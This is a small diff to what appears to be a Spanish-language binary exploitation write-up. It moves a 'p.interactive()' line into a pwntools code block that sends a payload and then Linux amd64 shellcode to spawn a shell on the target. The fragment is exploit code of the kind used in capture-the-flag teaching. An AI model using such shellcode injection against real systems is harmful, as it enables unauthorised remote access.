@@ -403,11 +403,9 @@ Lo que está haciendo es un bucle para leer por consola lo que le enviemos, lo g
 p.send(payload)
 sleep(0.5)
 p.sendline(asm(shellcraft.amd64.linux.sh()))
+p.interactive()
 ```
 
 Elegante ¿eh?
-
-
-p.interactive()
 
 
